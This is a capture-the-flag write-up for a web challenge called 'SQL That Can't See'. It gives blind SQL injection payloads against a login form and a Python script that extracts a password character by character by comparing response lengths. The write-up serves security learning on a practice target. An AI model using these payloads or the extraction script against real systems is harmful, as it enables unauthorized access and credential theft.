# Web

Challenge Name : SQL That Can't See

# Solution

Go back to My First SQL challenge website and try to enter `admin:admin`.

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210610085914.png)

Then look at the view source once you submit.

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210610085954.png)

There is a query from what we inputs in the view source.

```bash
SELECT email, password FROM users WHERE email = 'admin' and password = 'admin'
```

From the challenge description it say that the email should be this `godam@kuki.com` and the password consists of 11 characters with lowercases. First let us get a payload that could help us on retrieving the password character by character.

```bash
# Payload (Return True)
Email : godam@kuki.com' or 1=1-- 

# Payload (Return False)
Email : godam@kuki.com' and 2=1-- 
```

This tell us that the email is correct. So now we must have some condition to check the password.

```bash
# Payload (Return True)
Email : godam@kuki.com' and password like 'k%'--

# Payload (Return False)
Email : godam@kuki.com' and password like 'y%'--
```

We can just go on with this payload character by character but to make things faster I create this python script to retrieve the password. Use [this](https://curl.trillworks.com/) to convert curl to python

```python
import requests
import string
requests.packages.urllib3.disable_warnings()

headers = {
    'Host': 'skrctf.me',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Te': 'trailers',
    'Connection': 'close',
}
password = ""
for ranges in range(11):
	for i in string.ascii_lowercase:
		temp = password + i
		params = (
		    ('email', "godam@kuki.com' and password like '"+temp+"%'-- "),
		    ('password', "'--"),
		)

		response = requests.get('https://skrctf.me/ports/4000/index.php', headers=headers, params=params, verify=False)
#		print(len(response.text))
		if len(response.text) > 1700:
			password += i
			break
	print("Round ["+str(ranges+1)+"]")
	print(password)

print("Flag => SKR{"+password+"}")
```

Run the script will get us the flag!

# Flag

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210610102052.png)